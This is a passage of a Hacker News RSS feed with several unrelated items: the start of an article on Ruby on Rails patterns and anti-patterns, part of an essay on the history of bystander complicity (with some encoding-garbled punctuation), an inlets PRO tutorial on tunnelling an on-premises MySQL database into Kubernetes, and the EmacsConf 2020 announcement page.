<p>Common causes of anti-patterns in code are many. For example, a good one is when the good guy (pattern) becomes the bad guy (an anti-pattern). Let’s say you got used to using a particular technology at your previous company, and you gained a high level of competence in it. For the sake of the example, let’s use Docker. You know how to efficiently pack applications into Docker containers, orchestrate them in the cloud, and pull their logs down from the cloud. Suddenly, you get a new job where you need to ship front end applications. Since you know a lot about Docker and how to ship apps with it, your first decision is to package everything up and deploy it to the cloud.</p>
<p>But, little did you know, the front end apps are not that complex at your current job, and putting them into containers might not be the most effective solution. It first sounds like a good idea, but later down the road, it proves as counterproductive. This anti-pattern is called <a href="https://en.wikipedia.org/wiki/Law_of_the_instrument">“Golden Hammer”</a>.</p>
<p>It can be summed up with the saying, “If you have a hammer, everything looks like a nail”. If you are really good with Docker and orchestration of services, everything is a Docker service made to be orchestrated in the cloud.</p>
<p>These things happen and will happen. Good guys turn to bad buys, and vice-versa. But where do Ruby and Rails fit into this picture?</p>
<h2 id="ruby-first-then-rails"><a href="#ruby-first-then-rails" aria-label="ruby first then rails permalink"></a>Ruby First, Then Rails</h2>
<p>Most folks were introduced to Ruby by using Ruby on Rails, a popular framework for building websites quickly. I got acquainted with Ruby in the same way, nothing wrong with that. Rails is based on this well-established software pattern called Model-View-Controller, or MVC for short. But before we dive into details of the MVC pattern in Rails, one big fallacy that often happens is using Rails without learning Ruby properly.</p>
<p>The Rails framework was one of the go-to frameworks when you had an idea and wanted to build it fast. Nowadays, it’s a whole different story, Rails is still used, but not to the extent it was in its prime. Being so easy to use and run, a lot of beginners set out to build their web apps using rails new command. What happened then, along the road, problems started occurring. As a beginner, you are lured by the speed and simplicity of development with Rails, and everything works so magically and smoothly at first. Then you see you’ve taken a lot of ‘magic’ for granted, and you don’t understand what is going on behind the curtain.</p>
<p>I had this problem, and I’m sure many beginners and advanced beginners are suffering from it. You start with a framework in hand, you build on it, and when you try to add something highly custom, you can’t, because you’ve used up all the magic points from that framework. At that point, you have to go back to the beginning and learn the basics. Going back is no biggie, happens to the best of us. But the problem grows more significant if you move on without learning the essential things, like in Ruby. One good book that can help you in this regard is <a href="https://www.goodreads.com/book/show/3892688-the-well-grounded-rubyist">The Well-Grounded Rubyist</a>.</p>
<p>As a beginner, you don’t have to read it from start to end. But keep it by your side so you can consult it quickly. I am not saying that you should suddenly stop whatever you were doing and read the whole book, but stop from time to time and refresh your knowledge of the Ruby basics, it might open some new horizons for you.</p>
<h2 id="mvc-rails-bread--butter"><a href="#mvc-rails-bread--butter" aria-label="mvc rails bread  butter permalink"></a>MVC: Rails’ Bread &amp; Butter</h2>
<p>OK, but what about MVC? The Model-View-Controller pattern has been around for ages. It’s been adopted by many frameworks across a plethora of languages like Ruby (Rails), Python (Django), Java (Play, Spring MVC). The idea is to have separate components that each do their job:</p>
<ul>
<li>The Model handles data and business logic.</li>
<li>The View is for the presentation of the data and the user interface.</li>
<li>The Controller ties the two together by getting data from the Model and showing the View to the user.</li>
</ul>
<p>Sounds great in theory, and it’s excellent when the logic is minimal and your website doesn’t hold complex logic. That is where things get tricky, but we’ll get to that in a second.</p>
<p>MVC spread out like wildfire throughout the web development community. Even libraries like React, which is insanely popular these days is explained as the view layer of your web app. No other pattern has been popularized so much that it cannot be shaken off. Rails added the <a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">Publish-Subscribe</a> with ActionCable, where the concept of <a href="https://guides.rubyonrails.org/action_cable_overview.html#terminology">channels is described as the controller</a> of the MVC pattern.</p>
<p>But what are the anti-patterns there, in the so widely used pattern? Let’s go over some of the most common anti-patterns for each part of the MVC pattern.</p>
<h3 id="model-problems"><a href="#model-problems" aria-label="model problems permalink"></a>Model Problems</h3>
<p>As an application grows and business logic gets expanded, folks tend to overcrowd their models. Constant growth can lead to an anti-pattern called the Fat Model.</p>
<p>The famous ‘Fat Model, Skinny Controller’ pattern identifies as a bad guy, some as the good guy. We will say that having any of the fat is an anti-pattern. To better understand it, let’s get into an example. Imagine we have a streaming service like Spotify or Deezer. Inside it, we have a model for songs like this:</p>
<div data-language="rb"><pre><code><span>class</span> <span>Song</span> <span>&lt;</span> <span>ApplicationRecord</span>
  belongs_to <span>:album</span>
  belongs_to <span>:artist</span>
  belongs_to <span>:publisher</span>

  has_one <span>:text</span>
  has_many <span>:downloads</span>

  validates <span>:artist_id</span><span>,</span> presence<span>:</span> <span>true</span>
  validates <span>:publisher_id</span><span>,</span> presence<span>:</span> <span>true</span>

  after_update <span>:alert_artist_followers</span>
  after_update <span>:alert_publisher</span>

  <span>def</span> <span><span>alert_artist_followers</span></span>
    <span>return</span> <span>if</span> unreleased<span>?</span>

    artist<span>.</span>followers<span>.</span><span>each</span> <span>{</span> <span>|</span>follower<span>|</span> follower<span>.</span>notify<span>(</span><span>self</span><span>)</span> <span>}</span>
  <span>end</span>

  <span>def</span> <span><span>alert_publisher</span></span>
    <span>PublisherMailer</span><span>.</span>song_email<span>(</span>publisher<span>,</span> <span>self</span><span>)</span><span>.</span>deliver_now
  <span>end</span>

  <span>def</span> <span><span>includes_profanities</span></span><span>?</span>
    text<span>.</span>scan_for_profanities<span>.</span>any<span>?</span>
  <span>end</span>

  <span>def</span> <span><span>user_downloaded</span></span><span>?</span><span>(</span>user<span>)</span>
    user<span>.</span>library<span>.</span>has_song<span>?</span><span>(</span><span>self</span><span>)</span>
  <span>end</span>

  <span>def</span> <span><span>find_published_from_artist_with_albums</span></span>
    <span>.</span><span>.</span><span>.</span>
  <span>end</span>

  <span>def</span> <span><span>find_published_with_albums</span></span>
    <span>.</span><span>.</span><span>.</span>
  <span>end</span>

  <span>def</span> <span><span>to_wav</span></span>
    <span>.</span><span>.</span><span>.</span>
  <span>end</span>

  <span>def</span> <span><span>to_mp3</span></span>
    <span>.</span><span>.</span><span>.</span>
  <span>end</span>

  <span>def</span>…</code></pre></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pragmaticpineapple.com/introduction-to-ruby-on-rails-patterns-and-anti-patterns/">https://pragmaticpineapple.com/introduction-to-ruby-on-rails-patterns-and-anti-patterns/</a></em></p>]]>
            </description>
            <link>https://pragmaticpineapple.com/introduction-to-ruby-on-rails-patterns-and-anti-patterns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057531</guid>
            <pubDate>Wed, 11 Nov 2020 11:42:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The rise of the bystander as a complicit historical actor]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057512">thread link</a>) | @rbanffy
<br/>
November 11, 2020 | https://psyche.co/ideas/the-bystanders-rise-as-a-morally-complicit-actor-in-history | <a href="https://web.archive.org/web/*/https://psyche.co/ideas/the-bystanders-rise-as-a-morally-complicit-actor-in-history">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>At about 3 oâ€™clock</strong> one morning in the early spring of 1964, Kitty Genovese, 28, arrived home from the bar in New York City where she worked, as she did morning after morning. While she walked in darkness from the lot where sheâ€™d parked her car, an assailant attacked her, drove away and then returned to assault her some more. Genovese repeatedly screamed for help. Several neighbours reported hearing her but, as the <a href="https://aeon.co/essays/why-don-t-people-come-to-the-rescue-of-victims-of-crime" rel="noopener">story</a> goes, no one answered her calls. The assailant left her eventually to die.</p>
<p><em>The New York Times</em> gave the incident routine coverage: Genovese was one more victim of brutal assault on the streets of the city. But a couple of weeks later, the story made front-page news. There were no new facts or startling discoveries; what was new was the reframing of the story: where were the neighbours? How could they so heartlessly ignore the victimâ€™s cries for help? What was just another violent crime turned into a sensational murder case. Genovese became a household name associated with what grew into a controversial story about bystanders and their complicit silence. The residents of the Mowbray, an apartment complex in Queens across the street from the crime scene, were in the unenviable position of having to defend themselves from international criticism. They asserted that it was, after all, three in the morning and they were asleep â€“ moreover, with windows shut tight against the outside cold. Some claimed that, even if theyâ€™d called the police, they wouldnâ€™t have responded to yet another street crime.</p>
<p>Bystander incrimination has taken root. Over time, bystanders were called out for summary condemnation. The activist Abbie Hoffman remarked: â€˜And so you ask, â€œWhat about innocent bystanders?â€� But we are in a time of revolution. If you are a bystander, you are not innocent.â€™ The political philosopher Hannah Arendt, also writing in the 1960s, made the point by referring to the requirements of civil conduct: our â€˜vicarious responsibility for things we have not done, this taking upon ourselves the consequences for things we are entirely innocent of, is the price we pay for the fact that we live our lives not by ourselves but among our fellow [citizens].â€™</p>
<p>The alleged responsibilities of bystanders acquired such moral force that critics have pushed back. Victoria Barnett, author of <em>Bystanders: Conscience and Complicity During the Holocaust</em> (1999), asked: â€˜What lies beneath the surface [of silence]?â€™ suggesting that fear or perpetrator allegiance explains the reticence of onlookers. Henrik Edgren, another scholar who has written about bystanders, posits assertions that are similarly exculpatory, explaining that bystanders are often coerced from interfering in harmful acts. Offering canonic justification for bystander inertia, the evidence-based theory of the bystander effect proposed in 1968 by the social psychologists John Darley and Bibb LatanÃ© <a href="https://psycnet.apa.org/record/1968-08862-001" rel="nofollow noreferrer noopener">argued</a> that onlookers fail to intervene when they believe that others will.</p>
<p>The presumption of bystandersâ€™ responsibility has, however, crystallised into the predominant opinion. Good Samaritan laws ratify intervention and protect â€˜upstandersâ€™ from liability. Bystander intervention is now axiomatic, a paragon of civic behaviour. Consider, by contrast, an image from the Tulsa race massacre of 1921 in Oklahoma: men and women blithely go about their business while the city within view burns. Images of lynchings are also revealing: onlookers, hardly indifferent, are downright jubilant. Nazi authorities made a point of including onlookers in their documentation of persecution. Edgren is no doubt right about the risks of intervention, but it is just as likely that German onlookers felt lucky to be on the right side of history or were even impressed with the clarity that the Nazis achieved about who belonged to the new Germany and who didnâ€™t. Other images from the Nazi period confirm that looking on was acceptable behaviour, if not a joyful experience, often serving to bind observers into a community of privileged insiders. Images of <em>Kristallnacht</em>, for example, show spectators gazing inertly at a burning synagogue and urban passers-by oblivious to the effects of racially inspired vandalism.</p>
<p>Jews remonstrated as strongly against the indifference of onlookers as they did against their assailants</p>
<p><strong>Paradoxically, the Nazi</strong> period was pivotal in turning public opinion against bystanders. Victims were making themselves heard. In 1935, Joachim Prinz, a leader of the German Jewish community, wrote an early and classic statement of bystander incrimination when racism was again on the rise after a two-year lull in state-inspired antisemitism. The notorious Nuremberg Laws, which emerged later that year, would codify national apartheid. Jews, wrote Prinz, were dangerously vulnerable, but just as ominous, he asserted, was the silence of his compatriots: â€˜The Jews of small towns, who live at the market square without neighbours, whose children go to school without neighbouring children, feel the isolation â€¦â€™ It â€˜might be the hardest lot anyone can befallâ€™ â€“ as hard as persecution itself.</p>
<p>Jews, whose demise accelerated during the Second World War, remonstrated as strongly against the indifference of onlookers as they did against their assailants. Writing in 1944 from his hiding place in Warsaw, Tadeusz ObrÄ™ski reviled the Polish government-in-exile:</p>
<blockquote>Why â€¦ didnâ€™t it order the Poles, back in 1939, to help Jews hide from the German murderers? Why did they keep silent? Why did they let, and why are they still letting, us be destroyed, here on the Aryan side? â€¦ The Polish people betrayed three and a half million Jews. This is a fact which will be discussed in [future] history.</blockquote>
<p>ObrÄ™ski made sure that, in losing hope for survival, he would save his final, bitter words for feckless officials and ordinary citizens alike.</p>
<p>Itâ€™s unlikely that the turn from bystander innocence to bystander incrimination started during the Nazi period. We need more research on the history of bystander construction to clarify its emergence as consensus opinion. Did Black people in the United States, for example, implore white neighbours for protection against the systems of slavery and Jim Crow? We find little evidence for this until the mobilisation of the civil rights movement in the 1950s and â€™60s, and Black people did so then in good part because the Holocaust and its legacy exposed bystandersâ€™ complicity. Writing in 1963, Martin Luther King, Jr commented that, though it was â€˜â€œillegalâ€� to aid and comfort a Jew in Hitlerâ€™s Germany â€¦ had I lived in Germany at the time I would have aided and comforted my Jewish brothers.â€™ At the time, the Black militant magazine <em>The Liberator</em> frequently referred to the consequences of passivity during the Holocaust era, as it saw it, to inspire action as well, turning its attention to Black people themselves.</p>
<p>Historically, European Jews could hardly imagine that their neighbours wouldnâ€™t provide protection whenever they were collectively threatened. ObrÄ™skiâ€™s reference to betrayal is significant. For Jews, the system had been favourable. Their statutory emancipation from medieval ghettos, spanning the late-18th to late-19th centuries, promised their recognition as citizens, which entitled them to equal protections secured by the rule of law. It was not unreasonable for Jews to expect protection, if not from the state then from other Germans. As Prinz wrote: â€˜We would not find it all [isolation] so painful if we did not have the feeling that we once did have neighbours.â€™</p>
<p>Black Americans, by contrast had no choice but to rely on other Black Americans. Some even argue, and argue persuasively, that itâ€™s more prudent this way because relying on others for help would put Black people at the mercy of their capricious neighbours, a policy that ultimately proved fatal for Jews. In retrospect, Jews rued their naivety. They suffered from the unanticipated abandonment of their compatriots. Abandonment, <a href="https://www.jstor.org/stable/1344023?seq=1" rel="nofollow noreferrer noopener">wrote</a> the Holocaust survivor Vladimir JankÃ©lÃ©vitch, was â€˜one of the most frightful aspects of their ordealâ€™. Simon Wiesenthal, another survivor, elaborated: â€˜Our fathers had crept out of the confines of the [premodern] ghetto into the open world. They had worked hard and done all they could to be recognised by their fellow creatures. But it was all in vain.â€™ Like Prinz, Wiesenthal felt the sting of abject betrayal.</p>
<p>Informed by the memory of the Holocaust, onlookers metamorphosed into accessories to crime</p>
<p><strong>The discourse of bystander</strong> incrimination grew stronger in the 1960s. Bystanders were roundly condemned for their indifference. While onlookers and others offered exculpatory reasons for inaction, victims were unwavering: bystanders were unconditionally complicit. King, writing from a Birmingham jail, observed: â€˜We will have to repent in this generation not merely for the hateful words and the actions of the bad people but for the appalling silence of the good people.â€™ Jewish survivors were also vocal. At the signature Great March on Washington the same year, Prinz, now a German expatriate and American citizen, echoed what he wrote three decades before:</p>
<blockquote>When I was a rabbi of the Jewish community in Berlin under the Hitler regime â€¦ the most important thing that I learned â€¦ is that bigotry and hatred are not the most urgent problem. The most urgent, the most disgraceful, the most shameful and the most tragic problem is silence. A great people which had created a great civilisation had become a nation of onlookers â€¦ America must not become a nation of onlookers. America must not remain silent.</blockquote>
<p>The 1960s was the decade when Holocaust survivors started to publish their accounts for a largely unsympathetic audience: JankÃ©lÃ©vitch in 1967, Wiesenthal in 1969 and, among the most reflective memoirists, Jean AmÃ©ry in 1966. Later, AmÃ©ry wrote with bitter irony that: â€˜The expectation of help, the certainty …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/ideas/the-bystanders-rise-as-a-morally-complicit-actor-in-history">https://psyche.co/ideas/the-bystanders-rise-as-a-morally-complicit-actor-in-history</a></em></p>]]>
            </description>
            <link>https://psyche.co/ideas/the-bystanders-rise-as-a-morally-complicit-actor-in-history</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057512</guid>
            <pubDate>Wed, 11 Nov 2020 11:37:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Connect your on-premises databases to Kubernetes in the cloud]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057481">thread link</a>) | @alexellisuk
<br/>
November 11, 2020 | https://inlets.dev/blog/2020/11/06/hybrid-cloud-with-inlets.html | <a href="https://web.archive.org/web/*/https://inlets.dev/blog/2020/11/06/hybrid-cloud-with-inlets.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Learn how to connect private on-premises services to the public cloud with inlets</p>

<h2 id="what-is-hybrid-cloud-anyway">What is “hybrid cloud” anyway?</h2>

<p>Before we get started, let’s have a clear idea what “hybrid cloud” is all about.</p>

<blockquote>
  <p>“<strong>Hybrid Cloud</strong> is a composition of a public cloud and a private environment, such as a private cloud or on-premises resources, offering the benefits of multiple deployment models. … For example, an organization may store sensitive client data in house on a private cloud application, but interconnect that application to services provided on a public cloud as a software service.” – <a href="https://en.wikipedia.org/wiki/Cloud_computing#Hybrid_cloud">Wikipedia</a></p>
</blockquote>

<p>A hybrid cloud strategy can give a huge benefit for your business by moving workloads to a public cloud, leveraging the flexibility and robustness of managed services, while keeping sensitive data on a private cloud or local data center.</p>

<p>In this post, we’ll demonstrate how you can bring your on-premises services or databases into a Kubernetes cluster running on a public cloud.</p>

<p>This model applies for different use-cases:</p>
<ul>
  <li>perhaps you are in the middle of a digital transformation where some parts of the architecture is deployed on a public cloud, but they still need to integrate with some legacy services</li>
  <li>you have some sensitive data to be kept in a private data center due to data residency regulation</li>
</ul>

<h2 id="tutorial">Tutorial</h2>

<p>As an example, we will connect a WordPress instance running in the cloud with a MySQL server running locally. Still, this solution is perfectly applicable to other databases or services like e.g. an Oracle database, a MinIO cluster or a RabbitMQ service.</p>

<p><img src="https://inlets.dev/images/2020-11-06-hybrid-cloud-with-inlets/mysql-wordpress.png" alt="hybrid-mysql-wordpress"></p>

<blockquote>
  <p>Picture above: our target architecture, a WordPress in the cloud connecting to a MySQL on-prem via inlets PRO</p>
</blockquote>

<h3 id="pre-requisites">Pre-requisites</h3>

<p>You will need:</p>

<ul>
  <li>A Kubernetes cluster running on a public cloud (e.g. GKE, AKS, EKS, DOKS, …)</li>
  <li><code>kubectl</code>, configured to connect to the cluster</li>
  <li>A domain and access to your DNS admin panel to create a sub-domain</li>
  <li>A service, like a database, running locally</li>
  <li>You can use your inlets PRO license, or start <a href="https://docs.google.com/forms/d/e/1FAIpQLScfNQr1o_Ctu_6vbMoTJ0xwZKZ3Hszu9C-8GJGWw1Fnebzz-g/viewform?usp=sf_link">a free 14-day trial</a>.</li>
</ul>

<h3 id="create-the-inlets-pro-exit-server">Create the inlets PRO exit server</h3>

<p>Before we start an inlets-pro exit service, create a Kubernetes secret with a token:</p>

<div><div><pre><code>kubectl create secret generic inlets-token <span>--from-literal</span><span>=</span><span>token</span><span>=</span>&lt;a random token&gt;
</code></pre></div></div>

<p>First, start an inlets-pro exit server pod and make it public with a LoadBalancer service:</p>

<div><div><pre><code><span>apiVersion</span><span>:</span> <span>apps/v1</span>
<span>kind</span><span>:</span> <span>Deployment</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>inlets-pro-server</span>
<span>spec</span><span>:</span>
  <span>replicas</span><span>:</span> <span>1</span>
  <span>selector</span><span>:</span>
    <span>matchLabels</span><span>:</span>
      <span>app</span><span>:</span> <span>inlets-pro-server</span>
  <span>template</span><span>:</span>
    <span>metadata</span><span>:</span>
      <span>labels</span><span>:</span>
        <span>app</span><span>:</span> <span>inlets-pro-server</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
        <span>-</span> <span>name</span><span>:</span> <span>inlets-pro</span>
          <span>image</span><span>:</span> <span>inlets/inlets-pro:0.7.2</span>
          <span>imagePullPolicy</span><span>:</span> <span>IfNotPresent</span>
          <span>command</span><span>:</span> <span>[</span> <span>"</span><span>inlets-pro"</span> <span>]</span>
          <span>args</span><span>:</span>
            <span>-</span> <span>"</span><span>server"</span>
            <span>-</span> <span>"</span><span>--auto-tls"</span>
            <span>-</span> <span>"</span><span>--common-name=inlets.example.com"</span>
            <span>-</span> <span>"</span><span>--token-from=/etc/inlets/token"</span>
          <span>volumeMounts</span><span>:</span>
            <span>-</span> <span>name</span><span>:</span> <span>temp-volume</span>
              <span>mountPath</span><span>:</span> <span>/tmp</span>
            <span>-</span> <span>name</span><span>:</span> <span>inlets-token</span>
              <span>mountPath</span><span>:</span> <span>/etc/inlets</span>
              <span>readOnly</span><span>:</span> <span>true</span>   
      <span>volumes</span><span>:</span>
        <span>-</span> <span>name</span><span>:</span> <span>temp-volume</span>
          <span>emptyDir</span><span>:</span> <span>{}</span>        
        <span>-</span> <span>name</span><span>:</span> <span>inlets-token</span>
          <span>secret</span><span>:</span>
            <span>secretName</span><span>:</span> <span>inlets-token</span>
</code></pre></div></div>

<p>After applying this on the cluster, a exit server pod is available with:</p>

<ul>
  <li><code>auto-tls</code> enabled, meaning a TLS certificate for the <code>common-name</code> is automatically generated</li>
  <li>the default control port 8123</li>
  <li>the token available in the previously created secret</li>
</ul>

<p>Now expose the exit server with a LoadBalancer service:</p>

<div><div><pre><code><span>apiVersion</span><span>:</span> <span>v1</span>
<span>kind</span><span>:</span> <span>Service</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>inlets-pro-server</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>inlets-pro-server</span>
<span>spec</span><span>:</span>
  <span>type</span><span>:</span> <span>LoadBalancer</span>
  <span>ports</span><span>:</span>
    <span>-</span> <span>name</span><span>:</span> <span>control</span>
      <span>port</span><span>:</span> <span>8123</span>
      <span>targetPort</span><span>:</span> <span>8123</span>
  <span>selector</span><span>:</span>
    <span>app</span><span>:</span> <span>inlets-pro-server</span>
</code></pre></div></div>

<blockquote>
  <p>Instead of using a LoadBalancer service, a Kubernetes Ingress can also be used here, especially when bringing multiple services into your cluster.</p>
</blockquote>

<p>As you can see, we’ll only expose the control port 8123 to the outside world.
This is actually a good thing, as our database will only reachable from within our Kubernetes cluster, making it more secure.</p>

<p>Wait a little bit until the load balancer is created, grab it’s public IP address and point your domain (remember the common-name) to it.</p>

<div><div><pre><code><span>$ </span>kubectl get service inlets-pro-server
NAME                TYPE           CLUSTER-IP       EXTERNAL-IP       PORT<span>(</span>S<span>)</span>          AGE
inlets-pro-server   LoadBalancer   192.168.197.17   185.136.232.105   8123:31981/TCP   8m11s
</code></pre></div></div>

<blockquote>
  <p>TIP: Some cloud providers honor the <code>loadBalancerSourceRanges</code> field in the Service spec, which allows you to provide a list of IP CIDR blocks allowed to connect to the load balancer. By creating firewall rules, only connections coming from your on-prem data center are allowed.</p>
</blockquote>

<h3 id="start-the-inlets-pro-client">Start the inlets-pro client</h3>

<p>Now that the server part of the tunnel is running, it is time to start the client in our private data center.
Let’s say we have a MySQL instance available with an internal IP address <code>10.1.0.50</code>, start the inlets-pro client:</p>

<div><div><pre><code><span>$ </span>inlets-pro client <span>--license-file</span> ~/inlets-license <span>--port</span> 3306 <span>--url</span> wss://inlets.example.com:8123/connect <span>--upstream</span> 10.1.0.50 <span>--token</span> &lt;your token&gt; 
2020/11/05 13:23:21 Welcome to inlets-pro! Client version 0.7.2
2020/11/05 13:23:21 Licensed to: Johan Siebens &lt;xxxx@gmail.com&gt;, expires: xxx day<span>(</span>s<span>)</span>
2020/11/05 13:23:21 Upstream server: 10.1.0.50, <span>for </span>ports: 3306
inlets-pro client. Copyright Alex Ellis, OpenFaaS Ltd 2020
INFO[2020/11/05 13:23:21] Connecting to proxy                           <span>url</span><span>=</span><span>"wss://inlets.example.com:8123/connect"</span>
</code></pre></div></div>

<p>Perfect! Now the client made the connection, port 3306 of the server pod in our public cloud is accepting connection and will tunnel traffic to the MySQL instance.</p>

<h3 id="create-a-mysql-service">Create a MySQL service</h3>

<p>When we deploy WordPress, we could configure it to connect directly to the inlets-pro server pod, but it is better to create Kubernetes Service:</p>

<div><div><pre><code><span>apiVersion</span><span>:</span> <span>v1</span>
<span>kind</span><span>:</span> <span>Service</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>mysql</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>mysql</span>
<span>spec</span><span>:</span>
  <span>ports</span><span>:</span>
    <span>-</span> <span>name</span><span>:</span> <span>mysql</span>
      <span>port</span><span>:</span> <span>3306</span>
      <span>targetPort</span><span>:</span> <span>3306</span>
  <span>selector</span><span>:</span>
    <span>app</span><span>:</span> <span>inlets-pro-server</span>
</code></pre></div></div>

<p>The set of Pods targeted by this Service is determined by the same selector as the previous service, but this time it is a service of type ClusterIP, making it only accessible from inside the cluster.</p>

<h3 id="deploy-wordpress">Deploy WordPress</h3>

<p>The only thing left for our example is deploying a WordPress instance, connecting to the MySQL database via the inlets-pro tunnel:</p>

<div><div><pre><code><span>apiVersion</span><span>:</span> <span>apps/v1</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>wordpress</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>wordpress</span>
<span>spec</span><span>:</span>
  <span>selector</span><span>:</span>
    <span>matchLabels</span><span>:</span>
      <span>app</span><span>:</span> <span>wordpress</span>
  <span>template</span><span>:</span>
    <span>metadata</span><span>:</span>
      <span>labels</span><span>:</span>
        <span>app</span><span>:</span> <span>wordpress</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span>-</span> <span>image</span><span>:</span> <span>wordpress</span>
        <span>name</span><span>:</span> <span>wordpress</span>
        <span>env</span><span>:</span>
        <span>-</span> <span>name</span><span>:</span> <span>WORDPRESS_DB_HOST</span>
          <span>value</span><span>:</span> <span>mysql</span>
        <span>ports</span><span>:</span>
        <span>-</span> <span>containerPort</span><span>:</span> <span>80</span>
          <span>name</span><span>:</span> <span>wordpress</span>
</code></pre></div></div>

<blockquote>
  <p>note: this WordPress is not production-ready as it is missing the required volumes for the content</p>
</blockquote>

<p>Mission accomplished! Our WordPress application, running in a public cloud environments is using the MySQL server located in the private data center.</p>

<h2 id="wrapping-up">Wrapping up</h2>

<p>This tutorial gives us a short introduction on how inlets PRO can help us to build a hybrid cloud between existing servers and public cloud.
As a cheaper, easier alternative to a data-center uplink or managed product like AWS Direct Connect or Azure Express Route it is a very lightweight, but powerful, tool to bring your on-prem services to a cloud workload.</p>

<p>For the example we chose WordPress, but the same technique can be applied to any other applications that use TCP traffic.</p>

<ul>
  <li>Resource heavy ETL processes on the cloud, combining multiple data sources like private legacy databases and event streams in the public cloud.</li>
  <li>Data migrations from and to on-prem databases</li>
  <li>Connect your new application to legacy service during a digital transformation</li>
  <li>Keep your LDAP side on-premises in Active Directory and connect to a SaaS IDP product like Auth0. That way anyone can log into a website using their corporate identity without having to migrate Active Directory to the cloud.</li>
</ul>

<p>Further resources:</p>

<ul>
  <li><a href="https://docs.inlets.dev/">Read tutorials and documentation for inlets PRO and OSS</a></li>
  <li><a href="https://inlets.dev/">Kick the tires with free 14-day trial of inlets PRO</a></li>
  <li><a href="https://twitter.com/inletsdev/">Follow @inletsdev on Twitter</a></li>
</ul>

        </div></div>]]>
            </description>
            <link>https://inlets.dev/blog/2020/11/06/hybrid-cloud-with-inlets.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057481</guid>
            <pubDate>Wed, 11 Nov 2020 11:32:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EmacsConf – 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057456">thread link</a>) | @ProfDreamer
<br/>
November 11, 2020 | https://emacsconf.org/2020/ | <a href="https://web.archive.org/web/*/https://emacsconf.org/2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">



<div id="pagebody">







<div id="content" role="main">
<p>EmacsConf 2020 | Online Conference | <strong>November 28 and 29, 2020</strong><br>
<a href="https://emacsconf.org/i/emacsconf-logo1-256.png"><img src="https://emacsconf.org/i/emacsconf-logo1-256.png" width="256" height="256" alt="EmacsConf logo"></a><br>
<a href="https://emacsconf.org/2020/schedule/"><strong>Schedule</strong></a> | <a href="https://emacsconf.org/2020/poster/"><strong>Poster</strong></a> | <a href="https://emacsconf.org/2020/planning/">Planning</a> |
<a href="https://emacsconf.org/conduct/">Code of Conduct</a></p>

<p>EmacsConf is the conference about the joy of Emacs, Emacs Lisp, and
memorizing key sequences.</p>

<p>We are holding EmacsConf 2020 as a virtual (online) conference again
this year, especially now, given the current state of the world with
the ongoing global pandemic. We remain fully committed to freedom, and
we will continue using our infrastructure and streaming setup
consisting entirely of <a href="https://www.gnu.org/philosophy/free-sw.html">free software</a>, much like the last
EmacsConf. Check out the <a href="https://emacsconf.org/2020/schedule/"><strong>Schedule</strong></a> and
<a href="https://emacsconf.org/2020/poster/"><strong>Poster</strong></a> for more details.</p>

<h2>Watching</h2>

<p>On November 28 and 29 you will be able to watch the livestreams via
<a href="https://live.emacsconf.org/">https://live.emacsconf.org</a>, which also has details on how to watch the
streams using media players that support streaming (like mpv and VLC).</p>

<p>We'll record the conference and post the videos and links on the
individual talk pages. In the meantime, please enjoy
<a href="https://emacsconf.org/2019/talks/">last year's talks</a>.</p>

<h2>Participating</h2>

<p>For audience questions specifically, we will be experimenting with
using a collaboratively-editable Etherpad as the primary means of
collecting audience questions. We will be posting a link to the pad
closer to the event. If, however, you are unable to access the pad to
add your question(s), we will still try to take questions from our
questions-specific IRC channel (<code>#emacsconf-questions</code> on
<code>chat.freenode.net</code>), and ask one or two volunteers to kindly add
questions from that channel to the pad on behalf of folks who are not
able to or prefer not to use the web-based questions pad.</p>

<p>Come hang out with us in <code>#emacsconf</code> on <code>chat.freenode.net</code>.  You can
join the chat using <a href="ircs://chat.freenode.net:6697/emacsconf">your favourite IRC client</a>, or by visiting
<a href="https://chat.emacsconf.org/">chat.emacsconf.org</a> in your web browser, a self-hosted instance
of <a href="https://thelounge.chat/">The Lounge</a> free software web IRC client for EmacsConf.</p>

<h2>Updates</h2>

<p>Be sure to subscribe to our mailing list
<a href="https://lists.gnu.org/mailman/listinfo/emacsconf-discuss">emacsconf-discuss</a> for discussion and
announcements about the conference.</p>

</div>







</div>



</div></div>]]>
            </description>
            <link>https://emacsconf.org/2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057456</guid>
            <pubDate>Wed, 11 Nov 2020 11:26:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[hystreet.com]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25057455">thread link</a>) | @weinzierl
<br/>
November 11, 2020 | https://hystreet.com/en/methodology | <a href="https://web.archive.org/web/*/https://hystreet.com/en/methodology">archive.org</a>
